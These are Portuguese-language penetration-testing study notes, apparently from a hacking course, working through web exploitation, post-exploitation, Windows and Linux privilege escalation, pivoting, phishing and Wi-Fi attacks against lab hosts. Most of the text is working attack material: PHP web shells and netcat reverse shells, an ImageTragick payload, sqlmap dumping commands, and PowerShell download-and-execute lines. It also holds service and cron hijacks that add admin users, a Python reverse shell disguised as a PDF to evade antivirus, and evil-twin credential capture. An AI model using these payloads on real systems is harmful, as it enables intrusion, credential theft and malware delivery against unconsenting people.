Mandar o campo que deseja fazer intrusão para o INTRUDER do burpe suite e carregar a lista para fazer o bruteforce, podendo fazer o filtro pela palavra para saber quais palavras da wordlist é válida, ou está ativa. Na aula foi usado o link `192.168.1.10/turismo/ativar-conta.php` no parâmetro `login=`

- Fuzzing de Vulnerabilidade com o Burp

Fazer um bruteforce no burp com uma wordlist da seclists própria de fuzzing, dessa forma encontrando uma vulnerabilidade dando bypass na aplicação

Depois que interceptar a página, envia para o intruder, em Positions, limpa todas e adiciona apenas a posição que deseja. Em payload carregar a lista que precisa, no caso fuzzing na seclists. Depois adiciona em options->grep a palavra que vai identificar se deu certo ou não (resposta da aplicação), no caso Incorreto e adiciona SQL para notificar de erros SQL. Quando rodar, verificar onde não tem flag setada em incorreto e sql, pois possivelmente este será o payload correto. Para saber o payload basta selecionar e dar um send to decoder e fazer a decodificação de URL. O status possivelmente será 302 (redirecionamento) que possivelmente é o payload correto. Quando encontrar uma falha time-based enviar para o repeater e alterar o parâmetro Time e fazer o teste.. Os testes foram feitos na página de login e adm do host 192.168.1.10.

- Teste de LFI com BURPSUITE - Local File Inclusion

Fazer da mesma forma como explicado acima, porém no parâmetro `sobre.php` na url (GET) depois inserir o `GREP "include"` para saber o endereços que não deram certo, o que não estiver com o include marcado é porque foi o payload correto.

- Personalizando regras com Intruder do Burp Suite

Quando não conseguir enxergar os parâmetros que foram inseridos no form da página, verificar se não está encodado, assim possibilitando fazer uma personalização dos parâmetros enviando para o intruder, após descobrir qual encode a aplicação usa, e personalizar a wordlist separando por `:` se for o caso da aplicação. Em payloads Sets: `Custom Interator` Em Separator position: `:` Em payload Processing: Adicionar o tipo de encode, no exemplo `base64`. Host usado 192.168.1.10/logs

- Realizando ataques com o Intruder - Burp

    Tipos de Ataques: 

        Cluster bomb: Testa a lista inteira de usuários com a primeira senha

        Pitchfork: Posição um com a posição um das listas e não repete as credenciais "user:pass"

        Battering ran : Só trabalha com uma lista e repete o login na senha

    Payloads Sets: 

        Simple List: Lista pequena 

        Runtime File: Lista grande 

        Brute forcer: que gera as possibilidades na hora.


Realizando ataques de força bruta HYDRA

    hydra -v -L users.txt -P pass.txt 192.168.1.10 http-post-ou-get-form "/turismo/login.php:login=^USER^&senha=^PASS^&Login:incorreto"

    hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.0.2 http-post-form "/app/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:MSG-FALHA" -I

    hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

Faz um brute  force nos campos login e senha do formulário e "pressiona" o botão Login fazendo o filtro pela palavra incorreto sabendo que está com credenciais inválidas

- Problemas de autorização Exemplo

Acessar páginas onde o usuário comum não tenha acesso.

Ao fazer uso da ferramenta, caso haja algum login válido e tenha conseguido acessar algo, pegar o cookie e passar para a ferramenta fazer o brute force de diretório, na intenção de encontrar mais diretórios e páginas que eram para estar restritas usando por exemplo no gobuster o `-C "colocandoocookie"`

- Exemplos: Cookies e Sessões

Quando houver um redirecionamento forçando o navegador ir para a página correta, pode-se usar o CURL passando a página desejada de modo que ele não redirecione, a menos que use o `-L`. Podendo fazer o roubo do cookie, para ganhar acesso. O cookie da sessão do usuário limitado pode ser usado no curl na flag `-c "cookie"` Para facilitar o encontro de páginas. Para usar o curl no BURP, `--proxy 127.0.0.1:8080` A requisição passará pelo burp podendo fazer o redirecionamento também. No burp, pode usar lá em options e marcar Intercept Client Requests e alterar o location para a pagina de acesso full. Para roubo de sessão, escutar em uma porta e mandar o link para o alvo, quando a vítima clicar o cookie dela será enviado para o atacante, desse modo podendo roubar a sessão da vítima.

- File Disclosure

Acessar arquivos e fazer downloads do código fonte de páginas. Geralmente campos de upload, download e redirecionamento. Olhar o cookie e tentar decifrar e pedir outro arquivo, quando sem ideia, pode pedir o próprio arquivo de download.  No Host 192.200.0.20/sistema - troca o cookie para true e faz um download do conecta.php pegando os dados do mysql para acessar o banco, pegar a senha e acessar o ssh.

- Explorando inputs de Uploads

Identificar na aplicação campo de upload de arquivos. 

    192.200.40/_old/

Fazer o upload de arquivo com a extensão da aplicação .php .aspx <?php system($_POST['hack'])?>

    curl http://192.200.0.40/_old/upload/kidman.php -d "hack=id" 

Pegando o ID da máquina alvo

    curl http://192.200.0.40/_old/upload/kidman.php -d "hack=/bin/nc 192.168.2.10 4455 -e /bin/bash/"

Para pegar a shell verificar se tem o netcat funcionando e abrir uma shell 


- Bypass Upload: Extensões

Algumas aplicações fazem o filtro mas não fazem corretamente, se tentar fazer o upload do arquivo shell.phP ele pode aceitar, devido o último P estar maiúsculo. Subir a shell em GET ou POST e ganhar acesso ao host.

- Bypass Upload: .htaccess

Fazer o upload de um arquivo .htaccess pedindo para a aplicação interpretar como um `.php` todo arquivo `.qqrcoisa` da sua escolha. o código ficando: `AddType application/x-httpd-php .sec`

- Bypass Upload: Tipo de conteúdo

Quando a aplicação trava o envio de uma extensão diferente da que ele permite tanto pelo tipo do arquivo `.pdf` quanto pelo head `%PDF-1.5` É nesse caso necessário criar o script com a extensão `.php.pdf` com o head `%PDF-1.5`. para que a aplicação aceite o upload. Para fazer o teste, criar um script php com o comando  `echo mime_content_type('kidman.php.pdf');`  e ver se o script reconhece como pdf de fato contendo o head com a flag pdf. Nisso subir o arquivo para a aplicação e usar a falha de LFI para acessar o arquivo e executar comandos em `http://192.168.1.231/index.php?page=uploads/shell-get.php.pdf%00&kidman=id` Os caracteres `%00` servem para ignorar a extensao `.pdf`  no final

- Bypass de Upload de Imagens

Tentar as técnicas aprendidas acima, como alterar o head para `GIF89a` ou a extensão para `.gif` e buscar novas alternativas. Por exemplo, pesquisar por exploites de imagens para realizar testes. 192.200.0.130/uploads. ImageTragic.com CVE-2016-3714. Pegar o exploit.jpg  

	push graphic-context
		    viewbox 0 0 640 480
		    fill 'url(https:/";nc -e /bin/bash 192.200.1.86 443")'
		    pop graphic-context

e ver o comportamento da aplicação. Se positivo, pode se testar um wget na máquina do atacante ou ping ou nc reverso como no exemplo.

Outra tentativa seria inserir um código php no comentário da imagem:

	exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
	mv file.jpg file.php.jpg


- PHP Wrappers

São funcionalidades/parâmetros do PHP mais atual, onde pode ser usado para obter acesso aos arquivos do server nos campos de input.

    index.php?page=File:///../../../etc/passwd 

    index.php?page=data://text/plan,KidMan 

    index.php/data://text/plan;base64,REVTRUM= 

O comando em base64 é equivalente ao index.php?page=data://text/plan,<?php system(id);?> Pode-se fazer também uma shell em php com o comando 

            index.php?page=data://text/plan;base64,PD9waHAgc3lzdGVtKCRfR0VUWydoYWNrJ10pOyA/Pg==

OU passando diretamente o código se a aplicação aceitar index.php?page=data://text/plan,<?php system($_GET['hack']); ?>


- Testando e explorando: Joomla

Aplicação de código aberto onde tem vários exploits públicos e várias vulnerabilidades principalmente de sql injection. Depois de fazer o mapeamento do código publico e fazer a enumeração da aplicação, verificar por ferramentas feitas especialmente para a aplicação: joomscan

    joomscan -u http://192.200.0.106/ 

Enumera toda a aplicação buscando por vulns 44033 CVE-2017-8917 https://www.exploit-db.com/exploits/42033


    sqlmap -u "http://192.200.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 

Vai trazer as tabelas


    sqlmap -u "http://192.200.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica --tables -p list[fullordering]

    sqlmap -u "http://192.200.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica -T info --columns -p list[fullordering]

    sqlmap -u "http://192.200.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica -T info -C flag --dump -p list[fullordering]


- Explorando o PHPMailer

Consiste basicamente em explorar vulnerabilidades da aplicação onde há campos de envio de mensagens como de comentários ou formulários de solicitação de contato, por isso o mailer, fazendo uso de exploits do exploit-db.com/exploits/40969 adaptando para uso do ambiente de teste atual assim como também o diretório onde será salvo o arquivo gerado pelo exploit. Alterar os parâmetros do campo do formulário e preencher todos para não dar erro de envio. Deve descobrir um local para upload de arquivos e que possa clicar para executar o arquivo e validar o código enviado. Se não funcionar alterar entre os payloads disponíveis. Além de opcionalmente enviar uma shell para a aplicação usando o `$_GET` ou o `NC`. Host 192.200.0.125

- Construindo o Mindset Hacking

Sempre buscar saber como funciona toda a aplicação, seja buscando a aplicação na internet ou fazendo uma cópia, caso seja código aberto. Entendendo esse funcionamento, fica mais fácil a enumeração do alvo. Wordpress.org/download Fazer o donwload da aplicação para uso

    unzip arquivo.zip -d /caminho/desejado/unzipeg

Descompacta o arquivo baixado

    create database wordpress; 

Cria a base de dados para ser usada pelo wordpress

    mv wp-configSample wp-config.php 

Renomeia o exemplo do arquivo de configuração para deixar pronto

    nano wp-config.php 

Adiciona as informações do mysql e nome do banco de dados e finaliza a instalação na web.


- Testando e explorando: Wordpress

Fazendo o reconhecimento da plataforma e posteriormente rodando ferramentas para descobrir vulnerabilidades. Wordpress usa o phpass como hash de senha.

    gobuster dns -d grupokidmancorp.com -w /wordlist/smal.durb -t 30

Faz um BF na aplicação para descoberta de subdomínios

    wpscan --url blog.kidmancorp.com/blog --api-token tokenaquiaddress 

Apenas para auth user

    wpscan --url blog.kidmancorp.com/blog --api-token tokenapeiaddress --enumerate p --plugins-detection aggressive 

Busca por plugins da base previamente conhecida

    wpscan --url blog.kidmancorp.com/blog --api-token tokenapeiaddress --enumerate vp --plugins-detection aggressive 

Busca por uma lista de plugins vulneráveis

Procurar pelo nome do exploit-db plugin plugin wpforum 1.7 exploit 17684

/blog/wp-content/themes/classic/404.php Caminho do plugin 404

- Obtendo RCE via Wordpress

Quando com acesso à página de administração do wordpress, e para isso é recomendável procurar algum lugar que possibilite a edição e nisso inserindo um código php com o system(id); podendo executar códigos na aplicação e ganhar acesso ao servidor. Ao identificar, deve-se procurar o local/diretório deste plugin ou tema para poder ir até o mesmo e executar o código que foi inserido. tema usado foi o `404.php`

- Se mantendo atualizado OWASP

Open Web Application Security Project: https://owasp.org/

Laboratórios para montar local e/ou online:

        DBWA
        BWAPP
        PentesterLab

Livros:

        Webaplication Hackers
        Real World Bug Hunt
        Pentest em Aplicação web
        Arte de Invadir
        Arte de enganar
Filme:

        Prenda-me se for capaz
        VIPs

- Inserção de código direta

Exploração de aplicações que fazem comandos no server, por exemplo, a resposta de um comando PING, para dar bypass basta inserir o `| command #` Exemplo: `| ls #`

- Fazendo Select Direto Passando o banco MYSQL

    SELECT * FROM database.tabela 

O comando faz um dump na tabela do banco passado, de todos os campos, podendo ser passado, claro os nomes dos campos para ter uma saída mais limpa


## PÓS EXPLORAÇÃO


Diferença entre Shells -> interativa e não interativa

    python -c 'import pty; pty.spawn("/bin/bash")'
    script -qc /bin/bash /dev/null

Para pegar uma shel mais interativa.


- Transferência de arquivos: WEB

    service apache2 start

Subindo o servidor

    python -m SimpleHTTPServer 80

Subindo uma página local na porta informada usando python ou

        python3 -m http.server 80


Se conectando à ele (WINDOWS) Upload de arquivo jogar arquivo no host:

        1 - certutil.exe -urlcache -f http://192.200.1.6/file.exe file.exe Faz Download do arquivo

        2 - poweshell.exe wget http://192.200.1.6/file -OutFile file.exe Faz Download do arquivo

        3 - powershel.exe (New-Object  System.Net.WebClient).DownloadFile('http://192.200.1.6/file.exe','file.exe') Faz Download

        4 - powershel.exe IEX(New-Object System.Net.WebClient).DownloadString('http://192.200.1.6/file.exe','file.exe') Faz down e executa


Se conectando à ele (LINUX):

        wget http://192.200.1.6/file.exe -O /tmp/file.exe

        curl http://192.200.1.6/file.exe -o file.exe


- Transferência de arquivos: FTP

Subindo o servidor

        pip install pyftplib

Subindo o servidor com python

        sudo apt install python3-pyftpdlib

        python -m pyftpdlib -p 4455 --write


Se conectando à ele (WINDOWS):

        ftp ip-do-alvo door
        USER anonymous
        PASS anonymous
        get arquivo.ext


Criando arquivo de conexão (Quando a shell não é interativa)

	nano ftp.txt
	
.

	echo open 192.168.254.51  > ftp.txt

	echo USER anonymous >> ftp.txt

	echo PASS anonymous >> ftp.txt

	echo bin >> tp.txt

	echo get arquivo.ext >> ftp.txt

	echo quit >> ftp.txt
	
.

  	ftp -v -n -s:ftp.txt 

Usando o arquivo e baixando o arquivo do server


- Transferência de arquivos: HEX

Transferir um programa usando o caracteres em HEX para copiar no CMD do alvo e ter o programa lá

    upx -9 plink.exe 

Diminuir o tamanho do arquivo para gerar menos chars

    ls -lh plink.exe 

Verifica o arquivo em kbytes para saber o tamanho

    exe2hex -x plink.exe -p link.txt Usar -D 

Gera arquivo txt para colar no cmd (em sistema WIN mais antigos) 


- Transferência de arquivos: File Type

Mudar o header do arquivo para burlar a inserção do mesmo no alvo uma vez que o mesmo não tem outra possibilidade de rodar comando ou importar arquivos. Depois de já ter o RCE do alvo (arquivo que permita executar comandos no browser) gerar payload com `msfvenom linx-86-meter-tcp -f elf` para o sistema alvo. Criar arquivo com o `%PDF-1.3` e juntar os dois com `cat header shell > payload-psf` e depois adicionar a extensão `.pdf` caso o sistema alvo barre a inserção mesmo assim. Para usar, é necessário tirar o header devido ser `PDF` com o comando (no browser)...`hack=tail -n +2 uploads/payload.pdf > payload e depois ./payload` Lembrar: Olhar o diretório, payload do msfconsole, porta, IP

- Tunelamento: Linux

Enviar o serviço ssh do alvo para o atacante, quando o alvo está configurado para receber apenas conexões locais. Pra isso, é necessário usar o socat ou outros programas. no

 ALVO 
 
	socat TCP4:ip-pentester:8443 TCP4:127.0.0.1:22 
	
(deixar aberto o terminal rodando)

ATACANTE

	socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr 

Receberá a conexão reversa na máquina local


Nota: Para procurar pelo socat `whereis socat` ou `dpkg -l | grep socat`


- Escalando acesso SSH sem senha  (Not DONE)

Após feito o tunelamento usando o exemplo acima, deve-se criar as chaves pública e privada no atacante

Atacante 

        ssh-keygen -f chave 

(chave p/ alvo e chave.pub p/ server) 

Alvo (criar a estrutura do usuário)

        mkdir ~www-data

        mkdir ~/.ssh/

        touch ~/.ssh/authorized_keys

        echo "chave-publica(chave.pub)" > ~/.ssh/authorized_keys


Atacante

        ssh www-data@127.0.0.1 -p 2222 -i chave 

        ssh camila@192.168.1.31 -i id_rsa -o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedAlgorithms=+ssh-rsa

Conecta com o servidor alvo usando a chave public&private


- Tunelamento: SSH  (Not DONE)

Usar o que foi feito acima e fechar uma conexão usando o próprio ssh

    ssh -L 3333:127.0.0.1:3306 www-data@127.0.0.1 -p 2222 -i chave 

Onde 3333 é a porta local que fechará o túnel com a porta 3306 (mysql) do alvo, dessa forma podendo diretamente da máquina atacante acessar o mysql da máquina alvo.


- Tunelamento Windows (Not DONE)

O mesmo que foi feito no LINUX fazendo no Windows com o `plink.exe`, Subir ssh no atacante e rodar o comando do plink para tunelar a porta local do alvo na porta do atacante através do ssh que foi aberto na máquina do atacante.

Simular porta aberta enviando cmd:

No alvo 

        nc.exe -vnlp 5555 -s 127.0.0.1 -e cmd.exe

No atacante 

        sudo service ssh start

No Alvo 

        plink.exe -ssh -l user -pw root -R ip-hacker:1337:127.0.0.1(ip-local-alvo):5555 ip-hacker


- Enumeração Host: Windows

Comandos úteis para fazer o reconhecimento do ambiente

    whoami

    whoami /groups

    net user kidman

    ne user

    hostname

    systeminfo

    systeminfo | findstr "Os Name"

    systeminfo | findstr /C:"OS Name"

    tasklist

    tasklist /SVC

    ipconfig /all

    arp -a

    route print

    netstat -ano

    sc query windefend

    netsh advfirewall show currentprofile

    where /?

    where /R c:\web.txt Procura pelo arquivo web.txt

    findstr /s "pass=" *.txt 

Procura em arquivos txt a palavra pass=

    type /caminho/do/arquivo.txt 

Ler um arquivo igual o cat


- Enumeração automatizada: Windows

Ferramentas:

	WinPeas.bat 

Combina comandos com o a aula anterior e traz resultados interessantes do alvo

    WesNG 

Precisa dos dados `sysinfo.txt` para poder cruzar com a base atual e traz os possíveis exploit


- Privilégios e Mecanismos de Integridade

Usuário com nível de administrador não faz atividades administrativas devido o level mandatory ser Medium sempre é perguntado pela UAC para dor o ok na permissão  e executar a ação, diferente do usuário que tem a permissão do mandatory High.

Para saber o level:

        net user usuário. 

Para  trocar de usuário no terminal 

        runas /user:username cmd


- Estudo Técnico: Bypass UAC I e II

Passos: 

        Encontrar programa que tenha o HIGH nos privilégios, executar ele escutando com o procmon, 

        Procurar por registros `notfound` no diretório do usuário `HKCU`, 

        Alterar/criar um registro que não tenha ainda sido criado e pedir para ele executar o `cmd.exe`. 

        Assim terá um cmd com acesso privilegiado.

        Fazer download dos programas `SysinternalsSuite` para servir de análise dos programas e suas permissões. 

        Principais: Procmon e sigcheck. 


Nota: Boa parte dos programas chamados pelo cmd está no system32

    internals: sigcheck.exe -a -m C:\Windows\System32\notepad.exe | computerdefaults.exe | fodhelper.exe 

Mostra os privilégios que o programa precisa para funcionar. a Ideia é procurar o mais alto nível para explorar. Se o autoelevate estiver `true`, não será necessário a senha do administrador


Process Monitor Filtrar o nome do processo `Computerdefaults.exe` ou outro que tenha encontrado com privilégios. Depois executa o mesmo. Adicionar um filtro `reg`, filtrar o Path contains `HKCU`, Filtrar result contains name not found, Procurar registro shell open command que está setado como notfound. E adicionar o caminho `reg add caminho/do/refistro/completo`, Limpa a tela e executa o `procmon` de novo. Caso haja outra chamada em notfound adicionar ela `reg add caminho/do/registro/completo /v DelegateExecute(nome endontrado) /t REG_SZ` Já no filtro SUCCESS Verificar se já não há uma chamada sem valor e adicionar o `cmd.exe` com o comando `reg add caminho/do/registro/completo /d "cmd.exe" /f` Ou fazer via interface no registro. reiniciar o programa e o `cmd.exe` vai executar.

- Windows PrivEsc: Certificate Dialog

Diffie-Hellman `CVE-2019-1388` Vulnerabilidade que tem um executável, já inclusive no `github/jas502n/cve-2019-1388` Que quando executado, é necessário ver o sertificado da aplicação que automaticamente abre o `internet-explorer` como `user system`, que permite acessar os arquivos na barra de menu, que pode-se abrir o `/windows/system32/cmd.exe` quando o cmd abre, já abre como usuário system, podendo fazer qualquer modificação naquele alvo.

- Windows PrivEsc: Serviços I e II

É uma falha onde você após estar com a shell, vai tentar identificar onde há serviços que são manipuláveis pelo seu usuário atual, alterando o path dele com um comando para injetar uma shell nele e ganhar acesso a nível de sistema... DllHijack, trocar o path da dll que esta com notfound e colocar a dll gerada no msfvenom

    wmic service get Name,State,PathName | findstr "Runing" | findstr "Program"

    icacls "c:/caminho/do/programa/aqui.exe" 

Se houver o (F) significa FULL ACCESS

Alternativa

        accesschk.exe -wvcu "Users" * 


No sysinternals pode usar o programa passado e obter informações diretamente, assim podendo achar informações que o grupo users pode ter full access

    sc query NomeDoServico 

Pegar informações do serviço

    sc qc NomeDoServico 

Pegar informações do serviço

    sc config NomeDoServiço binPath="net user hack adm@123 /add" 

Altera o Path para rodar o comando quando o programa for reiniciado

    sc stop NomeDoServico

    sc start NomeDoServico

    sc config NomeDoServiço binPath="certutils -urlcache -f http://ip:porta/shell.exe shell.exe"

Criar uma shell com o msfvenom em exe
Reiniciar o programa/serviço

    sc config NomeDoServiço binPath="shell.exe"

Reiniciar o programa/serviço


Nota: Quando sem permissão de alterar o path do serviço nem reiniciar, pode-se tentar adicionar a shell no diretório deste serviço e substituir o nome da shell pelo nome do programa usando o comando MOVE e colocar para reiniciar o host, fazendo com que ao iniciar, o "programa" (shell) inicie junto.

- Enumeração Host: Linux

.

	id

	cat /etc/passwd

	hostname

	uname -a

.

	cat /etc/issue 

Versão exata do ubuntu/SO

    cat /etc/*-release 

Informações de versões do sistema (search for exploits)

    dpkg -l | grep "wget"

    ifconfig -a

    route

    netstat -nlpu | nlpt 
   
. 

    ps aux 

Programas que estão em execução

    cat etc/crontab 

Pega a tabela de agendamento de tarefas

    find / -writable -type d2>/dev/null 

Pega os arquivos que tem permissão de escrita pelo user atual

    find /caminho/do/diretorio -user fernando -type f \( -perm -u=wx \) -print

Pega os arquivos do usuário fernando que tem permissão de execução e escrita pelo user atual

    find / -perm -4000 2 >/dev/null

Find All SUID binaries

    find / -perm -u=s -type f 

Pega os arquivos do usuário com priv alto

    sudo -l 

Lista prog que estão sendo executados pelo sudo


- Enumeração automatizada: Linux

.

    LinPeas 

Ferramenta de enumeração para linux, do criador do WinPeas GitHub/carlospolop/linpeas

    Linux-Exploit-Suggester 

Outra ferramenta de enumeração linux - github/mzet-/linux...


- Linux PrivEsc: Sudo

Quando dado o comando sudo -l ele te mostra quais programas são iniciados com o sudo... se caso tiver mostrando o VIM ou ALL

    vim -c '!id'

    sudo vim -c '!id'

    sudo vim -c '!bash' 

    :!bash

    docker run --rm -it -v "/:/mnt" bash

- Linux PrivEsc: Permissões e Cron

Ao enumerar o host identificar possíveis diretórios com permissão de escrita.

    ls -la /etc/cron* 

Lista as cron que roda no servidor

    cat /etc/crontab

    find / -type f -perm 777 2 >/dev/null
    
.

    ls -la /etc/cron.outly/
	LOCALIZA a LIB base64 que ta importada lá no script sem permissao de edição e adiciona a seguinte linha import os \n os.system("/usr/sbin/adduser joao sudo")

 
Se o arquivo tem permissão 777 editar e colocar o código..

    nc -e /bin/bash Ip-do-Atacante Porta


Desafio: Invadir os hosts 192.200.0.15,20,30,40 e pegar o acesso ao host coreserver

- Linux PrivEsc: Kernel

Procurar por vulnerabilidades, podendo usar a ferramenta do Linux-Exploit-Suggester. Ao encontrar as CVEs pesquisar por exploits públicos, no exemplo DirtyCows cowroot.c

Com o exploit, deve-se atentar para o payload, identificando se o sistema é 32 ou 64bits

    gcc priv.c -o -pthread -m32 Usar o -m32 

Para compilar para sistema 32bits, se 64 não passa nada. Usar –static caso tenha erro

Com o arquivo em mãos 

        ./arquivo 

E passará a ter acesso root ao sistema. 48.60.285.342/blog

    wget https://link.aqui.com -no-check-certificate 

Wget com flag para não checar o certificado https

PrivEsc Linux Kernel 2024: [EXPLOIT](https://github.com/Notselwyn/CVE-2024-1086)

- Pivoting: Da internet para a rede interna

Ao ganhar acesso a uma máquina na internet, verificar a possibilidade de navegar na rede interna daquele host, que é chamado de Pivoting. Usando uma shell para conectar com o Meterpreter

    meterpreter> ifconfig 

Verificar as interfaces

    meterpreter> route 

Verifica a tabela de roteamento

    meterpreter> run autoroute -s 10.10.20.0/24 

Faz uma rota para a rede interna podendo ser varrida pelo meterpreter

    meterpreter> background 

Deixar a sessão em segundo plano

    meterpreter> use auxiliary/server/socks4a 

Módulo para comunicar com a máquina local RUN

    sudo nano etc/proxychains.conf

Editrar: 127.0.0.1 1080 Porta do modulo aberto no metasploit

    proxychains nmap -v --open -sT -p 110,139 -Pn 10.10.20.0/24 

Usar o proxychains para varrer a rede

Ao descobrir uma porta 10.10.20.4 porta 110 É possível fazer um tunelamento para a máquina atacante através do meterpreter na sessão do host principal

    meterpreter> sessions -i 1 

Volta para a máquina que está exposta na internet

    meterpreter> portfwd -l 110 -p 110 -r 10.10.20.4

Faz um portfwd com meterpreter

    nmap -v -sV -p 110 10.10.20.4


## ENGENHARIA SOCIAL


Livros:

        Arte de Invadir

        Arte de enganar

Filmes:

        Prenda-me se for capaz
        VIPs

- Campanhas de Phishing

Ferramenta `GoPhish github/gophish/releases`, baixa a ferramneta dá `chmod 777 ./gophish` e depois `./gophish` e acessa o link que vai aparecer no terminal e coloca a senha que também aparece no terminal. Configura o usuário alvo, template origem, a landing page e o email sender, caso seja Gmail `smtp.gmail.com:465` na conta do gmail, ativar o 2FA e coloca a opção adicionar um outro app cria um nome para o app -> copia os caracteres -> em sending profiles adiciona o email e os caracteres copiado do 2FA.

- Código indetectável pelos antivírus disfarçado de PDF

.

	import socket,os

	os.popen(explorer http://site.com/pdf)

	ip = "192.168.25.2"

	porta = 80

	s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip,porta))

	while True:

	    cmd = s.recv(1024)

	    for comando in os.popen(cmd):

		  s.send(comando)

Podendo ser feito um exe usando o python

        pyinstaller.exe ..\cod.py --onefile --windowed --icon=pdf.ico


Nota: 	Criar um arquivo sfx com o winrar e abrir o código por trás dando acesso à shell da máquina

Cherrrytree Editor de texto bem organizado e bom para anotações de relatórios

## WIFI HACKING BONUS INTRODUÇÃO


Colocar a placa de rede wireless em modo monitor para escutar os dados que estão trafegando próximo da placa de rede.

    iwconfig 

Informações da placa de wireless

    airmon-ng 

Ferramenta de monitoramento de rede wireless

    airmon-ng check 

Checa os processos abertos

    airmon-ng check kill 

Mata os processos abertos

    iwconfig wlan1 mode monitor 

Habilitar apenas a placa wireless sem matar os as outras redes 

    airmon-ng start wlan-interface 

Habilitar o adaptador wireless para entrar em modo monitor

    tcpdump -vv -i wlan0mon 

Capturar os sinais que estão próximos 

    airodump-ng wlan0mon 

Capturar dados dos sinais wifi próximos e trazer informações organizadas

    airodump-ng wlan0mon -c1 

Capturar dados dos sinais wifi que estão no canal 1

    airodump-ng wlan0mon -c1 --bssid MAC ADDRESS 

Capturar dados dos sinal usando o MAC do rtr

    airmon-ng stop wlan0mon 

Parar a captura dos sinais wifi

    service network-manager start 

Restaura a rede wireless para o modo managed


Quando escutando no BSSID que é do roteador alvo e receber o MAC da estação e o modo de bloqueio for MAC e não a senha WPA2, pode-se trocar o MAC da placa de rede do atacante macchanger -m MA:CD:MA:C wlan-interf e subir a interface novamente para acessar a rede wifi.

## ATTACKS WIFI ROUTE, EVILTWIN, WPA

Após deixar a placa em modo de captura habilitado, rodar o comando abaixo para monitorar os sinais próximos.

 
	sudo airmon-ng start wlan1
	airodump-ng wlan0mon -c1 --bssid MAC ADDRESS -w captura.wpa2.cap
	sudo airodump-ng wlan0mon -w file-capture --manufacturer --wps --band bag

Coloca em modo de captura salvando em arquivo.cap

	aireplay-ng -0 10 -a MAC-ROUTER -c MAC-CLIENT  wlan-interf 

Manda 10 pacotes de  desautenticação. 

Quando aparecer o handshake no canto superior da tela, parar a captura e pagar o arquivo que foi salvo a captura.

    aircrack-ng captura.wpa.cap -w /caminho/wordlist 

Faz um bruteforce da senha wpa capturada.

    airdecap-ng -p s3nh4d0w1f1 captura.cap -e ssid-em-texto 

Vai gerar um arquivo para ler no wireshark

	network={
			ssid="visitantes"
			key_mgmt=NONE
	}
	OU
	sudo wpa_passphrase wifi-name P@assWd  > clients.conf


Criando o arquivo para se conectar à rede `wifi.conf`

	sudo wpa_supplicant -Dnl80211 -iwlan2 -c visitantes.conf
	sudo dhclient wlan4

Usando o arquivo para se conectar à rede - pode ser com uma rede disponivel OU com uma rede em monitoramento, como abaixo, para capturar pacotes dentro dessa rede

	sudo airmon-ng start wlan1
	sudo ip link set wlan1mon down
	sudo macchanger -m CC:D0:83:B0:78:88 -p wlan2mon
	sudo ip link set wlan1mon up

Caso não funcione, pode ser filtro de MAC - troca por um mac de um dispositivo já conectado usando os comandos acima

	sudo wpa_supplicant -Dnl80211 -iwlan1mon -c visitantes.conf

Depois conecta no wifi e ver se funciona com o novo MAC

	sudo mdk4 wlan0mon p -t F0:9F:C2:71:22:56 -s 100 -f /usr/share/doc/mdk4/common-ssids.txt

Attack de SSID oculto bruteforce para encontrar o SSID - Ele não vai aparecer na captura do airodump `<length:  8> ` com o comando acima, é possivel fazer a descoberta dessa rede

	sudo besside-ng -c 1 -b F0:9F:C2:71:22:56 wlan0mon -v

Aparentemente comando para enviar DEAUTH para capturar o WEP password

- ROGUE AP

Técnica para criar um sinal wifi igual ao target e capturar a chave PSK
Pode ser usado para descobrir chaves e quebrar para descobrir a senha

Passo1 Criar um arquivo propagar o sinal clonado com a ferramenta `hostapd-mana`

	interface=wlan1
	driver=nl80211
	hw_mode=g
	channel=1
	ssid=sala-402
	mana_wpaout=hostapd.hccapx
	wpa=2
	wpa_key_mgmt=WPA-PSK
	wpa_pairwise=TKIP CCMP
	wpa_passphrase=12345678

Salve o arquivo `rogue_ap.conf`

	sudo hostapd-mana rogue_ap.conf

Passo2 Converta a chave para ficar usável pelo jhon

	hccapx2john hostapd.hccapx > hash_sala
	john --wordlist=/usr/share/wordlists/rockyou.txt hash_sala

- Evil Twin WPA Enterprise

Ataque de Evil Twin

	cd tools/eaphammer
	sudo python3 ./eaphammer --cert-wizard
	sudo python3 ./eaphammer -i wlan3 --auth wpa-eap --essid mtia --creds --negotiate balanced

Observar o output da ferramenta e capturar a hash do usuário NTLM

	echo 'hahs-ntlm-found' > hash-evil-twin
	john --wordlist=/usr/share/wordlists/rockyou.txt hash-evil-twin

Após encontrar a senha, se conectar ao roteador da rede

	nano mtia.conf 
	.
	network={
	   ssid="mtia"
	   scan_ssid=1
	   key_mgmt=WPA-EAP
	   identity="FLORIPA\gabi.tr"
	   anonymous_identity=""
	   password="Secret!"
	   eap=PEAP
	   phase1="crypto_binding=0 peaplabel=0"
	   phase2="auth=MSCHAPV2"
	   bssid_blacklist=02:00:00:00:01:00
	}

Conecte-se à rede com o arquivo criado

	sudo wpa_supplicant -D nl80211 -i wlan1 -B -c mtia.conf
	sudo dhclient wlan1
	sudo arp-scan -l -I wlan1

- Gerencia de redes WIFI e ETH

Comandos de gerenciamento de redes WIFI e cabeadas

	sudo ifconfig eth0 up
	sudo ifconfig eth0 192.168.20.20 netmask 255.255.255.0
	sudo route add default gw 192.168.20.1 dev eth0
	sudo ifconfig wlan0 up
	iw dev wlan0 scan |grep SSID
	networkctl --no-pager
	sudo wpa_passphrase SSI-NAME P@ss\$2022  > /etc/wpa_supplicant.conf
	wpa_supplicant -B -iwlan0 -c /etc/wpa_supplicant.conf
	iw wlan0 link    
